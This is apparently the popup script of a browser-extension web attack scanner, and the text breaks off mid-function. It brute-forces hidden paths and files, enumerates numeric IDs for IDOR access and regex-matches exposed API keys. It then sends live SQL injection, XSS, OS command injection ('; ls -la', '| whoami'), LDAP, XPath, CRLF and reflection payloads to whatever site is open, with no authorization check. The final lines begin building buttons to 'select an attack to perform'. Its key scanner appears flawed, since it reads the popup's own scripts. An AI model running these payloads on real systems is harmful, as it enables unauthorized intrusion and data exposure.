/* Import dependencies for Cryptographic Failures scanning */
import * as acorn from "./libs/acorn.js";
window.acorn = acorn; // Make Acorn globally accessible

/* ----------------------- Tab Switching ----------------------- */
document.querySelectorAll(".tab-btn").forEach(button => {
    button.addEventListener("click", () => {
        // Remove active class from all tabs and buttons
        document.querySelectorAll(".tab").forEach(tab => tab.classList.remove("active"));
        document.querySelectorAll(".tab-btn").forEach(btn => btn.classList.remove("active"));

        // Get the data-tab attribute from the clicked button
        const tabId = button.getAttribute("data-tab");

        // Show the corresponding tab and activate the button
        document.getElementById(tabId).classList.add("active");
        button.classList.add("active");
    });
});

/* ----------------------- General Scan Functionality ----------------------- */
document.getElementById("scanButton").addEventListener("click", async () => {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const url = new URL(tab.url);
    const outputDiv = document.getElementById("scanResults");
    outputDiv.innerHTML = ""; // Clear any existing content
    outputDiv.innerHTML = "🔍 Scanning...";

    try {
        // Fetch IP information from ip-api.com
        const ipApiResponse = await fetch(`http://ip-api.com/json/${url.hostname}`);
        const ipApiData = await ipApiResponse.json();

        console.log("IP API Response:", ipApiData);

        if (ipApiData.status === "success") {
            outputDiv.innerHTML = `
          <div class="scan-section">
            <h3>IP Information</h3>
            <p><strong>🌐 IP:</strong> ${ipApiData.query}</p>
            <p><strong>🏙️ City:</strong> ${ipApiData.city || "Not available"}</p>
            <p><strong>🗺️ Region:</strong> ${ipApiData.regionName || "Not available"}</p>
            <p><strong>🇺🇸 Country:</strong> ${ipApiData.country || "Not available"}</p>
            <p><strong>💻 ISP:</strong> ${ipApiData.isp || "Not available"}</p>
          </div>
        `;
        } else {
            outputDiv.innerHTML = `<p>❌ Failed to fetch IP information.</p>`;
        }

        // Fetch DNS records
        const dnsRecords = await fetchDNSRecords(url.hostname);
        // Fetch WHOIS information
        const whoisInfo = await fetchWhoisInfo(url.hostname);
        // Fetch SSL certificate information
        const sslInfo = await fetchSSLInfo(url.hostname);
        // Fetch HTTP headers
        const httpHeaders = await fetchHTTPHeaders(url.hostname);

        outputDiv.innerHTML += `
        <div class="scan-section">
          <h3>DNS Records</h3>
          <pre>${JSON.stringify(dnsRecords, null, 2)}</pre>
        </div>
        <div class="scan-section">
          <h3>WHOIS Information</h3>
          <pre>${JSON.stringify(whoisInfo, null, 2)}</pre>
        </div>
        <div class="scan-section">
          <h3>SSL Details</h3>
          <pre>${JSON.stringify(sslInfo, null, 2)}</pre>
        </div>
        <div class="scan-section">
          <h3>HTTP Headers</h3>
          <pre>${JSON.stringify(httpHeaders, null, 2)}</pre>
        </div>
      `;
    } catch (error) {
        console.error("Error occurred while fetching data:", error);
        outputDiv.innerHTML = "❌ Error occurred while fetching data.";
    }
});

// Helper functions for General Scan
async function fetchDNSRecords(domain) {
    const dnsAPIUrl = `https://dns-toolkit.onrender.com/dns-records?domain=${domain}`;
    const response = await fetch(dnsAPIUrl);
    if (!response.ok) {
        throw new Error(`DNS API error: ${response.status}`);
    }
    return response.json();
}

async function fetchWhoisInfo(domain) {
    const whoisAPIUrl = `https://dns-toolkit.onrender.com/domain-details?domain=${domain}`;
    const response = await fetch(whoisAPIUrl);
    if (!response.ok) {
        throw new Error(`WHOIS API error: ${response.status}`);
    }
    return response.json();
}

async function fetchSSLInfo(domain) {
    const sslAPIUrl = `https://dns-toolkit.onrender.com/ssl-info?domain=${domain}`;
    const response = await fetch(sslAPIUrl);
    if (!response.ok) {
        throw new Error(`SSL API error: ${response.status}`);
    }
    return response.json();
}

async function fetchHTTPHeaders(domain) {
    const headersAPIUrl = `https://dns-toolkit.onrender.com/headers?domain=${domain}`;
    const response = await fetch(headersAPIUrl);
    if (!response.ok) {
        throw new Error(`Headers API error: ${response.status}`);
    }
    return response.json();
}

/* ----------------------- Broken Access Control ----------------------- */
// Global scan state variables
let scanInProgress = false;
let scanAbortController = null;

// Start Scan Functionality for Hidden URLs
document.getElementById("hiddenUrlsButton").addEventListener("click", async () => {
    if (scanInProgress) return; // Prevent starting a new scan if one is already in progress

    // Reset UI
    resetOutput();
    await scanHiddenUrls(); // Scan for Hidden URLs
});

// Start Scan Functionality for .txt Files
document.getElementById("scanTxtButton").addEventListener("click", async () => {
    if (scanInProgress) return;

    resetOutput();
    await scanTxtFiles(); // Scan for .txt files
});

// Start Scan Functionality for .html Files
document.getElementById("scanHtmlButton").addEventListener("click", async () => {
    if (scanInProgress) return;

    resetOutput();
    await scanHtmlFiles(); // Scan for .html files
});

// Start Scan Functionality for .php Files
document.getElementById("scanPhpButton").addEventListener("click", async () => {
    if (scanInProgress) return;

    resetOutput();
    await scanPhpFiles(); // Scan for .php files
});

// Helper function to reset output and progress indicators
function resetOutput() {
    const outputDiv = document.getElementById("hiddenUrlsOutput");
    const progressText = document.getElementById("progressText");
    const foundCount = document.getElementById("foundCount");

    // Clear output and reset progress text
    outputDiv.innerHTML = "";
    progressText.innerText = "Progress: 0%";
    foundCount.innerText = "Found URLs: 0";
}

// Function to load wordlist (either uploaded or default)
async function loadWordlist() {
    const fileInput = document.getElementById("wordlistUpload");
    let wordlistContent = "";

    if (fileInput.files.length > 0) {
        // Use the uploaded wordlist
        const file = fileInput.files[0];
        wordlistContent = await file.text();
    } else {
        // Fall back to the default wordlist
        const response = await fetch(chrome.runtime.getURL("common.txt"));
        wordlistContent = await response.text();
    }

    // Parse the wordlist into an array of paths
    return wordlistContent.split("\n").map(line => line.trim()).filter(line => line !== "");
}

// Function to scan for Hidden URLs
async function scanHiddenUrls() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const baseURL = new URL(tab.url).origin;
    const outputDiv = document.getElementById("hiddenUrlsOutput");
    const progressText = document.getElementById("progressText");
    const foundCount = document.getElementById("foundCount");

    // Load the wordlist
    const commonUrls = await loadWordlist();
    const totalUrls = commonUrls.length;

    let scannedUrls = 0;
    let foundUrlsCount = 0;
    let scannedPaths = new Set();

    // Hide all scan buttons and show Stop button
    hideAllScanButtons();
    document.getElementById("stopScanButton").style.display = "inline-block";

    scanInProgress = true;
    scanAbortController = new AbortController();
    const signal = scanAbortController.signal;

    try {
        for (let path of commonUrls) {
            if (!scanInProgress) break;

            if (scannedPaths.has(path)) continue;
            scannedPaths.add(path);

            try {
                let url = `${baseURL}/${path}`;
                let res = await fetch(url, { method: "GET", headers: { "User-Agent": "Mozilla/5.0" }, signal });

                if (res.status === 200) {
                    outputDiv.innerHTML += `✅ Accessible: <a href="${url}" target="_blank">${url}</a><br>`;
                    foundUrlsCount++;
                } else if (res.status === 403) {
                    outputDiv.innerHTML += `⛔ Forbidden (403): <a href="${url}" target="_blank">${url}</a> (Exists but blocked)<br>`;
                    foundUrlsCount++;
                }
            } catch (error) {
                if (error.name === 'AbortError') {
                    console.log("Scan was aborted.");
                    break;
                }
                console.warn(`❌ Error checking ${path}: ${error}`);
            }

            scannedUrls++;
            let progressPercent = Math.round((scannedUrls / totalUrls) * 100);
            progressText.innerText = `Progress: ${scannedUrls}/${totalUrls} (${progressPercent}%)`;
            foundCount.innerText = `Found URLs: ${foundUrlsCount}`;
        }

        if (foundUrlsCount === 0) {
            outputDiv.innerHTML = "✅ No accessible URLs found.";
        }
    } catch (err) {
        if (err.name !== 'AbortError') {
            outputDiv.innerHTML = "❌ Error loading the wordlist.";
        }
    } finally {
        progressText.innerText = `Progress: ${totalUrls}/${totalUrls} (100%)`;
        document.getElementById("stopScanButton").style.display = "none";
        showAllScanButtons();
        scanInProgress = false;
    }
}

// Function to scan for .txt files
async function scanTxtFiles() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const baseURL = new URL(tab.url).origin;
    const outputDiv = document.getElementById("hiddenUrlsOutput");
    const progressText = document.getElementById("progressText");
    const foundCount = document.getElementById("foundCount");

    const commonUrls = await loadWordlist();
    const totalUrls = commonUrls.length;

    let scannedUrls = 0;
    let foundTxtFilesCount = 0;
    let scannedPaths = new Set();

    hideAllScanButtons();
    document.getElementById("stopScanButton").style.display = "inline-block";

    scanInProgress = true;
    scanAbortController = new AbortController();
    const signal = scanAbortController.signal;

    try {
        for (let path of commonUrls) {
            if (!scanInProgress) break;

            let txtUrl = `${baseURL}/${path}.txt`;

            try {
                let txtRes = await fetch(txtUrl, { signal });
                if (txtRes.status === 200) {
                    outputDiv.innerHTML += `✅ Found .txt: <a href="${txtUrl}" target="_blank">${txtUrl}</a><br>`;
                    foundTxtFilesCount++;
                } else {
                    console.log(`Not found: ${txtUrl}`);
                }
            } catch (error) {
                if (error.name === 'AbortError') {
                    console.log("Scan was aborted.");
                    break;
                }
                console.warn(`❌ Error checking ${path}: ${error}`);
            }

            scannedUrls++;
            let progressPercent = Math.round((scannedUrls / totalUrls) * 100);
            progressText.innerText = `Progress: ${scannedUrls}/${totalUrls} (${progressPercent}%)`;
            foundCount.innerText = `Found URLs: ${foundTxtFilesCount}`;
        }

        if (foundTxtFilesCount === 0) {
            outputDiv.innerHTML = "✅ No .txt files found.";
        }
    } catch (error) {
        if (error.name !== 'AbortError') {
            outputDiv.innerHTML = "❌ Error loading the wordlist or scanning .txt files.";
        }
    } finally {
        progressText.innerText = `Progress: ${totalUrls}/${totalUrls} (100%)`;
        document.getElementById("stopScanButton").style.display = "none";
        showAllScanButtons();
        scanInProgress = false;
    }
}

// Function to scan for .html files
async function scanHtmlFiles() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const baseURL = new URL(tab.url).origin;
    const outputDiv = document.getElementById("hiddenUrlsOutput");
    const progressText = document.getElementById("progressText");
    const foundCount = document.getElementById("foundCount");

    const commonUrls = await loadWordlist();
    const totalUrls = commonUrls.length;

    let scannedUrls = 0;
    let foundHtmlFilesCount = 0;
    let scannedPaths = new Set();

    hideAllScanButtons();
    document.getElementById("stopScanButton").style.display = "inline-block";

    scanInProgress = true;
    scanAbortController = new AbortController();
    const signal = scanAbortController.signal;

    try {
        for (let path of commonUrls) {
            if (!scanInProgress) break;

            let htmlUrl = `${baseURL}/${path}.html`;

            try {
                let res = await fetch(htmlUrl, { signal });
                if (res.status === 200) {
                    outputDiv.innerHTML += `✅ Found .html: <a href="${htmlUrl}" target="_blank">${htmlUrl}</a><br>`;
                    foundHtmlFilesCount++;
                } else {
                    console.log(`Not found: ${htmlUrl}`);
                }
            } catch (error) {
                if (error.name === 'AbortError') {
                    console.log("Scan was aborted.");
                    break;
                }
                console.warn(`❌ Error checking ${path}: ${error}`);
            }

            scannedUrls++;
            let progressPercent = Math.round((scannedUrls / totalUrls) * 100);
            progressText.innerText = `Progress: ${scannedUrls}/${totalUrls} (${progressPercent}%)`;
            foundCount.innerText = `Found URLs: ${foundHtmlFilesCount}`;
        }
        if (foundHtmlFilesCount === 0) {
            outputDiv.innerHTML = "✅ No .html files found.";
        }
    } catch (error) {
        if (error.name !== 'AbortError') {
            outputDiv.innerHTML = "❌ Error loading the wordlist or scanning .html files.";
        }
    } finally {
        progressText.innerText = `Progress: ${totalUrls}/${totalUrls} (100%)`;
        document.getElementById("stopScanButton").style.display = "none";
        showAllScanButtons();
        scanInProgress = false;
    }
}

// Function to scan for .php files
async function scanPhpFiles() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const baseURL = new URL(tab.url).origin;
    const outputDiv = document.getElementById("hiddenUrlsOutput");
    const progressText = document.getElementById("progressText");
    const foundCount = document.getElementById("foundCount");

    const commonUrls = await loadWordlist();
    const totalUrls = commonUrls.length;

    let scannedUrls = 0;
    let foundPhpFilesCount = 0;
    let scannedPaths = new Set();

    hideAllScanButtons();
    document.getElementById("stopScanButton").style.display = "inline-block";

    scanInProgress = true;
    scanAbortController = new AbortController();
    const signal = scanAbortController.signal;

    try {
        for (let path of commonUrls) {
            if (!scanInProgress) break;

            let phpUrl = `${baseURL}/${path}.php`;

            try {
                let res = await fetch(phpUrl, { signal });
                if (res.status === 200) {
                    outputDiv.innerHTML += `✅ Found .php: <a href="${phpUrl}" target="_blank">${phpUrl}</a><br>`;
                    foundPhpFilesCount++;
                } else {
                    console.log(`Not found: ${phpUrl}`);
                }
            } catch (error) {
                if (error.name === 'AbortError') {
                    console.log("Scan was aborted.");
                    break;
                }
                console.warn(`❌ Error checking ${path}: ${error}`);
            }

            scannedUrls++;
            let progressPercent = Math.round((scannedUrls / totalUrls) * 100);
            progressText.innerText = `Progress: ${scannedUrls}/${totalUrls} (${progressPercent}%)`;
            foundCount.innerText = `Found URLs: ${foundPhpFilesCount}`;
        }
        if (foundPhpFilesCount === 0) {
            outputDiv.innerHTML = "✅ No .php files found.";
        }
    } catch (error) {
        if (error.name !== 'AbortError') {
            outputDiv.innerHTML = "❌ Error loading the wordlist or scanning .php files.";
        }
    } finally {
        progressText.innerText = `Progress: ${totalUrls}/${totalUrls} (100%)`;
        document.getElementById("stopScanButton").style.display = "none";
        showAllScanButtons();
        scanInProgress = false;
    }
}

// Stop Scan Functionality for all scans
document.getElementById("stopScanButton").addEventListener("click", () => {
    if (scanAbortController) {
        scanAbortController.abort(); // Trigger the abort signal
    }

    // Update UI to reflect stopped scan
    document.getElementById("hiddenUrlsOutput").innerHTML = "❌ Scan Stopped.";
    document.getElementById("stopScanButton").style.display = "none";
    showAllScanButtons();
    scanInProgress = false;
});

// File Input and Display Elements
const fileInput = document.getElementById("wordlistUpload");
const fileNameDisplay = document.getElementById("fileNameDisplay");
const removeFileButton = document.getElementById("removeFileButton");

// Show the file name when a file is selected
fileInput.addEventListener("change", () => {
    if (fileInput.files.length > 0) {
        fileNameDisplay.textContent = `Selected: ${fileInput.files[0].name}`;
        removeFileButton.style.display = "inline-block";
    } else {
        fileNameDisplay.textContent = "";
        removeFileButton.style.display = "none";
    }
});

// Remove File Button Functionality
removeFileButton.addEventListener("click", () => {
    fileInput.value = "";
    fileNameDisplay.textContent = "";
    removeFileButton.style.display = "none";
});

// Numeric Iteration Scan Functionality
document.getElementById("numericScanButton").addEventListener("click", async () => {
    if (scanInProgress) return;

    resetOutput();

    const prefix = document.getElementById("prefixInput").value.trim();
    const iterations = parseInt(document.getElementById("iterationsInput").value, 10);
    const startFrom = document.getElementById("startFromInput").value.trim();
    const extension = document.getElementById("extensionInput").value.trim();

    if (!prefix || isNaN(iterations) || iterations <= 0) {
        document.getElementById("hiddenUrlsOutput").innerHTML = "❌ Please enter a valid prefix and number of iterations.";
        return;
    }

    await scanNumericIterations(prefix, iterations, startFrom, extension);
});

// Function to scan numeric iterations
async function scanNumericIterations(prefix, iterations, startFrom, extension) {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const baseURL = new URL(tab.url).origin;
    const outputDiv = document.getElementById("hiddenUrlsOutput");
    const progressText = document.getElementById("progressText");
    const foundCount = document.getElementById("foundCount");

    let startNumber = 0;
    const totalUrls = iterations;

    if (startFrom) {
        startNumber = parseInt(startFrom, 10);
        if (isNaN(startFrom)) {
            outputDiv.innerHTML = "❌ Invalid start number format.";
            return;
        }
    }

    let scannedUrls = 0;
    let foundUrlsCount = 0;

    hideAllScanButtons();
    document.getElementById("stopScanButton").style.display = "inline-block";

    scanInProgress = true;
    scanAbortController = new AbortController();
    const signal = scanAbortController.signal;

    try {
        for (let i = startNumber; i < startNumber + iterations; i++) {
            if (!scanInProgress) break;

            let path = prefix;
            if (i > 0) {
                path += i.toString().padStart(startFrom.length || 1, '0');
            }
            if (extension) {
                path += extension;
            }

            let url = `${baseURL}/${path}`;

            try {
                let res = await fetch(url, { method: "GET", headers: { "User-Agent": "Mozilla/5.0" }, signal });
                if (res.status === 200) {
                    outputDiv.innerHTML += `✅ Accessible: <a href="${url}" target="_blank">${url}</a><br>`;
                    foundUrlsCount++;
                } else if (res.status === 403) {
                    outputDiv.innerHTML += `⛔ Forbidden (403): <a href="${url}" target="_blank">${url}</a> (Exists but blocked)<br>`;
                    foundUrlsCount++;
                }
            } catch (error) {
                if (error.name === 'AbortError') {
                    console.log("Scan was aborted.");
                    break;
                }
                console.warn(`❌ Error checking ${path}: ${error}`);
            }

            scannedUrls++;
            let progressPercent = Math.round((scannedUrls / totalUrls) * 100);
            progressText.innerText = `Progress: ${scannedUrls}/${totalUrls} (${progressPercent}%)`;
            foundCount.innerText = `Found URLs: ${foundUrlsCount}`;
        }

        if (foundUrlsCount === 0) {
            outputDiv.innerHTML = "✅ No accessible URLs found.";
        }
    } catch (err) {
        if (err.name !== 'AbortError') {
            outputDiv.innerHTML = "❌ Error scanning numeric iterations.";
        }
    } finally {
        progressText.innerText = `Progress: ${totalUrls}/${totalUrls} (100%)`;
        document.getElementById("stopScanButton").style.display = "none";
        showAllScanButtons();
        scanInProgress = false;
    }
}

// Helper functions to hide/show scan buttons
function hideAllScanButtons() {
    document.getElementById("hiddenUrlsButton").style.display = "none";
    document.getElementById("scanTxtButton").style.display = "none";
    document.getElementById("scanHtmlButton").style.display = "none";
    document.getElementById("scanPhpButton").style.display = "none";
    document.getElementById("numericScanButton").style.display = "none";
}

function showAllScanButtons() {
    document.getElementById("hiddenUrlsButton").style.display = "inline-block";
    document.getElementById("scanTxtButton").style.display = "inline-block";
    document.getElementById("scanHtmlButton").style.display = "inline-block";
    document.getElementById("scanPhpButton").style.display = "inline-block";
    document.getElementById("numericScanButton").style.display = "inline-block";
}

/* ----------------------- Insecure Direct Object Reference (IDOR) ----------------------- */
async function scanIDOR() {
    // Get the active tab's URL origin
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const baseOrigin = new URL(tab.url).origin; // e.g., "http://cyberstrike.zapto.org"

    // Retrieve user inputs
    const urlPattern = document.getElementById("idorUrlPattern").value.trim(); // e.g., "profile.php?id="
    const startValue = parseInt(document.getElementById("idorStartInput").value, 10) || 1;
    const iterations = parseInt(document.getElementById("idorIterationsInput").value, 10) || 10;

    const outputDiv = document.getElementById("idorOutput");
    outputDiv.innerHTML = "🔍 Starting IDOR scan...<br>";

    // Loop through the specified range and append the number to the pattern
    for (let i = startValue; i < startValue + iterations; i++) {
        // Construct the full URL (ensuring a slash between the origin and the pattern)
        // e.g., "http://cyberstrike.zapto.org/profile.php?id=17"
        const testUrl = `${baseOrigin}/${urlPattern}${i}`;

        try {
            const res = await fetch(testUrl, { method: "GET" });
            if (res.status === 200) {
                outputDiv.innerHTML += `✅ Accessible: <a href="${testUrl}" target="_blank">${testUrl}</a><br>`;
            } else if (res.status === 403) {
                outputDiv.innerHTML += `⛔ Forbidden (403): <a href="${testUrl}" target="_blank">${testUrl}</a> (Exists but blocked)<br>`;
            } else if (res.status === 404) {
                outputDiv.innerHTML += `❌ Not Found (404): <a href="${testUrl}" target="_blank">${testUrl}</a><br>`;
            } else {
                outputDiv.innerHTML += `ℹ️ Response ${res.status}: <a href="${testUrl}" target="_blank">${testUrl}</a><br>`;
            }
        } catch (error) {
            outputDiv.innerHTML += `❌ Error accessing: ${testUrl}<br>`;
        }
    }
    outputDiv.innerHTML += "🔍 IDOR scan complete.";
}

// Attach event listener to the IDOR scan button
document.getElementById("idorScanButton").addEventListener("click", async () => {
    await scanIDOR();
});

/* ----------------------- Cryptographic Failures ----------------------- */
let cf_findings = [];

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "network_vulnerability") {
        console.log("✅ Received vulnerability:", message.data);
        cf_findings.push(message.data);
        cf_updateUIWithFindings(cf_findings);
        sendResponse({ status: "received and updated" });
    }
});

/**
 * Scans the given website for Cryptographic Failures vulnerabilities.
 * @param {string} url - The hostname or URL of the website to scan.
 * @returns {Promise<{site: string, findings: Array}>}
 */
const cf_scanForVulnerabilities = async (url) => {
    cf_findings = [];
    const detectedKeys = await cf_detectHardcodedKeys(url);
    cf_findings.push(...detectedKeys);
    await new Promise((resolve) => setTimeout(resolve, 500));
    console.log("✅ Final CF findings:", cf_findings);
    return { site: url, findings: cf_findings };
};

/**
 * Detects hardcoded cryptographic keys in JavaScript for Cryptographic Failures.
 * @param {string} url - The hostname or URL of the website to scan.
 * @returns {Promise<Array>} - A list of vulnerability findings.
 */
const cf_detectHardcodedKeys = async (url) => {
    let localFindings = [];
    let scripts = await cf_getScriptsFromPage(url);
    const keyPatterns = [
        /['"](AIza[0-9A-Za-z\-_]{35})['"]/g,
        /['"](sk_live_[0-9a-zA-Z]{24})['"]/g,
        /['"](AKIA[0-9A-Z]{16})['"]/g,
        /['"]([0-9a-fA-F]{32,64})['"]/g
    ];
    scripts.forEach(script => {
        try {
            keyPatterns.forEach(pattern => {
                let match;
                while ((match = pattern.exec(script.code)) !== null) {
                    localFindings.push({
                        cwe: 321,
                        issue: "Hardcoded cryptographic key detected in JavaScript.",
                        location: `${script.url}:${match.index}`,
                        evidence: match[1],
                        severity: "High",
                        recommendation: "Do not hardcode cryptographic keys in source code. Use environment variables instead."
                    });
                }
            });
        } catch (error) {
            console.error("Error parsing script: ", error);
        }
    });
    return localFindings;
};

/**
 * Retrieves JavaScript code from the current webpage for Cryptographic Failures scanning.
 * @param {string} url - The hostname or URL of the website.
 * @returns {Promise<Array>} - A list of scripts with their URL and code.
 */
const cf_getScriptsFromPage = async (url) => {
    let scripts = [];
    document.querySelectorAll("script").forEach(script => {
        if (script.src) {
            fetch(script.src)
                .then(response => response.text())
                .then(code => {
                    scripts.push({ url: script.src, code });
                })
                .catch(error => {
                    console.error("Error fetching script:", script.src, error);
                });
        } else {
            scripts.push({ url: "inline-script", code: script.textContent });
        }
    });
    return scripts;
};

/**
 * Dynamically updates the UI with Cryptographic Failures vulnerability findings.
 * @param {Array} findings - Array of vulnerability objects.
 */
const cf_updateUIWithFindings = (findings) => {
    const outputDiv = document.getElementById("cfOutput");
    if (findings.length > 0) {
        outputDiv.innerHTML = `<h3>🛡️ Cryptographic Vulnerabilities Found:</h3>`;
        findings.forEach(finding => {
            outputDiv.innerHTML += `
        <div class="finding">
          <p><strong>⚠️ CWE-${finding.cwe}:</strong> ${finding.issue}</p>
          <p><strong>📍 Location:</strong> ${finding.location}</p>
          <p><strong>📝 Evidence:</strong> ${finding.evidence}</p>
          <p><strong>📊 Severity:</strong> ${finding.severity}</p>
          <p><strong>💡 Recommendation:</strong> ${finding.recommendation}</p>
          <hr>
        </div>`;
        });
    } else {
        outputDiv.innerHTML = `<p>✅ No cryptographic vulnerabilities found!</p>`;
    }
};

// Event listener for the "Cryptographic Failures" button
document.getElementById("cfButton").addEventListener("click", async () => {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const url = new URL(tab.url);
    const outputDiv = document.getElementById("cfOutput");
    outputDiv.innerHTML = "";
    try {
        const scanResults = await cf_scanForVulnerabilities(url.hostname);
        cf_updateUIWithFindings(scanResults.findings);
    } catch (error) {
        console.warn("Vulnerability scanner error:", error);
        outputDiv.innerHTML += `<p style="color: orange;">⚠️ Vulnerability scanning failed. Check the console for details.</p>`;
    }
});

/* ----------------------- Injection ----------------------- */
document.getElementById("injectionButton").addEventListener("click", async () => {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const url = new URL(tab.url);

    console.log("Checking for injection vulnerabilities:", url.hostname);

    const outputDiv = document.getElementById("injectionOutput");

    try {
        // Array to store detected vulnerabilities
        const vulnerabilities = [];

        // === [1] SCANNING LOGIC (same as yours) ===

        // CWE-89: SQL Injection
        const sqlInjectionPayload = "username=admin&password=1234' OR '1'='1";
        const sqlResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: sqlInjectionPayload,
        });
        const sqlText = await sqlResponse.text();
        if (sqlText.includes("error") || sqlText.includes("SQL syntax")) {
        vulnerabilities.push("CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')");
        }

        // CWE-79: Cross-Site Scripting (XSS)
        const xssPayload = "<script>alert('XSS')</script>";
        const xssResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `username=admin&comment=${encodeURIComponent(xssPayload)}`,
        });
        const xssText = await xssResponse.text();
        if (xssText.includes(xssPayload)) {
        vulnerabilities.push("CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')");
        }

        // CWE-77: Command Injection
        const commandInjectionPayload = "; ls -la";
        const commandResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `username=admin&command=${encodeURIComponent(commandInjectionPayload)}`,
        });
        const commandText = await commandResponse.text();
        if (commandText.includes("bin") || commandText.includes("etc")) {
        vulnerabilities.push("CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')");
        }

        // CWE-78: OS Command Injection
        const osCommandInjectionPayload = "| whoami";
        const osCommandResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `username=admin&command=${encodeURIComponent(osCommandInjectionPayload)}`,
        });
        const osCommandText = await osCommandResponse.text();
        if (osCommandText.includes("root") || osCommandText.includes("user")) {
        vulnerabilities.push("CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')");
        }

        // CWE-90: LDAP Injection
        const ldapInjectionPayload = "*)(uid=*))(|(uid=*";
        const ldapResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `username=${encodeURIComponent(ldapInjectionPayload)}&password=1234`,
        });
        const ldapText = await ldapResponse.text();
        if (ldapText.includes("error") || ldapText.includes("LDAP")) {
        vulnerabilities.push("CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')");
        }

        // CWE-91: XML Injection (Blind XPath Injection)
        const xmlInjectionPayload = "' or '1'='1";
        const xmlResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        body: `<user><username>${xmlInjectionPayload}</username><password>1234</password></user>`,
        });
        const xmlText = await xmlResponse.text();
        if (
        xmlText.includes("error") ||
        xmlText.includes("XPath") ||
        xmlText.includes("invalid") ||
        xmlText.includes("syntax")
        ) {
        vulnerabilities.push("CWE-91: XML Injection (aka Blind XPath Injection)");
        } else {
        console.log("No evidence of XPath injection vulnerability.");
        }

        // CWE-113: HTTP Response Splitting
        const httpResponseSplittingPayload = "%0d%0aSet-Cookie: injected=value";
        const httpResponseSplittingResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `username=admin${httpResponseSplittingPayload}`,
        });
        const httpResponseSplittingText = await httpResponseSplittingResponse.text();
        if (httpResponseSplittingText.includes("injected=value")) {
        vulnerabilities.push("CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')");
        }

        // CWE-116: Improper Encoding or Escaping of Output
        const encodingPayload = `<script>alert("escaped")</script>`;
        const encodingResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `username=${encodeURIComponent(encodingPayload)}`,
        });
        const encodingText = await encodingResponse.text();
        if (encodingText.includes(encodingPayload)) {
        vulnerabilities.push("CWE-116: Improper Encoding or Escaping of Output");
        }

        // CWE-470: Unsafe Reflection
        const reflectionPayload = "reflection_input=java.lang.Runtime.getRuntime().exec('calc')";
        const reflectionResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: reflectionPayload,
        });
        const reflectionText = await reflectionResponse.text();
        if (reflectionText.includes("Runtime") || reflectionText.includes("exec")) {
        vulnerabilities.push("CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')");
        }

        // CWE-643: XPath Injection
        const xpathInjectionPayload = "xpath_query=') or ('1'='1";
        const xpathResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: xpathInjectionPayload,
        });
        const xpathText = await xpathResponse.text();
        if (xpathText.includes("XPath")) {
        vulnerabilities.push("CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')");
        }

        // CWE-75: Special Element Injection
        const specialElementPayload = "username=<script>alert('specialInjection')</script>";
        const specialElementResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: specialElementPayload,
        });
        const specialElementText = await specialElementResponse.text();
        if (specialElementText.includes("specialInjection")) {
        vulnerabilities.push("CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)");
        }

        // CWE-74: Injection into a Downstream Component
        const downstreamPayload = "username=<script>alert('downstream')</script>";
        const downstreamResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: downstreamPayload,
        });
        const downstreamText = await downstreamResponse.text();
        if (downstreamText.includes("downstream")) {
        vulnerabilities.push("CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')");
        }

        // CWE-88: Argument Injection
        const argumentInjectionPayload = "command=--option 'malicious_argument'";
        const argumentInjectionResponse = await fetch(url.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: argumentInjectionPayload,
        });
        const argumentInjectionText = await argumentInjectionResponse.text();
        if (argumentInjectionText.includes("malicious_argument")) {
        vulnerabilities.push("CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')");
        }

        // === [2] DISPLAY RESULTS & CREATE BUTTONS ===

        if (vulnerabilities.length > 0) {
            outputDiv.style.borderColor = "red";
            outputDiv.innerHTML = `
        ⚠️ Potential injection vulnerabilities detected!
        <br>
        Vulnerabilities:
        <ul style="list-style-type: disc; padding-left: 20px; text-align: left;">
          ${vulnerabilities.map((vuln) => `<li>${vuln}</li>`).join("")}
        </ul>
        <p style="text-decoration: underline;">\nSelect an attack to perform:</p>
      `;

            // Create buttons container for the attacks
            let buttonsHtml = "<div>";
